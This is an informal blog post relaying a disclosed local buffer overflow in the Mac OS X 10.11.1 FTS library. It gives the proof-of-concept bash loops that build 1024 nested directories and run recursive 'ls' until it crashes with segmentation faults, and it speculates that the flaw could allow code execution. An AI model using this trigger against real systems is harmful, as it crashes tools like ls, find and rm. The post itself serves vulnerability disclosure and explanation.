<p>
  I was browsing around and found this cool little hack someone (Maksymilian Arciemowicz) found. It's pretty cool. It's a buffer overflow in Mac OS X 10.11.1 FTS.

  What your doing is making 1024 directories and cd'ing into them using a for loop in bash.
  Then you're cd'ing back out 1024 directoires back to where you started.
  Then you are ls'ing recursivly with -a to ignore hidden, -l single column and -R recursive. You won't see any output if you run the sample below, it's being sent to dev/null (incase you didn't know)
</p>

<p>
  When you do this it will lead to a segment fault, this is when a program tries to read or write to an illegal portion of memory. You have just crashed the program from a buffer overflow.

  There's no CVE at the time I'm writing this, I ran into this lastnight and took my time writing this :-D. Also the english grammer isn't the best, but you should understand it.

<p><b> Code: </b></p>

  {% highlight text %}

  Affected software:
  - Commands such as: ls, find, rm
  - probably more

  Apple file system suffer for a issue recognised in FTS library. The main problem occur when we create deep filesystem hierarchy. Unexpected behavior of many programs and invalid memory write seems really interesting.

  PoC:
  Create an direcotry and perform the following actions:


  # for i in {1..1024}; do mkdir B && cd B; done
  ...
  cd: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory


  If such error occur, don't panic script will continuing. When the script will finish, you need back to top of directory. E.g.


  # for i in {1..1024}; do cd .. ; done


  Then you can perform recursive 'ls' command. Let's run it ten times:


  # for i in {1..10}; do ls -laR > /dev/null; done
  ls: B: No such file or directory
  ls: B: No such file or directory
  ls: B: No such file or directory
  ls: B: No such file or directory
  ls: B: No such file or directory
  ls: B: No such file or directory
  ls: B: No such file or directory
  ls: B: No such file or directory
  Segmentation fault: 11
  Segmentation fault: 11
  Segmentation fault: 11
  ls: B: No such file or directory
  ls: B: No such file or directory
  Segmentation fault: 11
  ls: B: No such file or directory
  ls: B: No such file or directory


  crash randometly. Let's see valgrind and lldb

   Luckily this isn't a remote vulnerability, but buffer overflows aren't good either. Those shouldn't be taken lightly, this could be a serious vulnerability. This could lead to code execution leading to someone running as root. See their site for the LLDB (debug) of what happened in the background
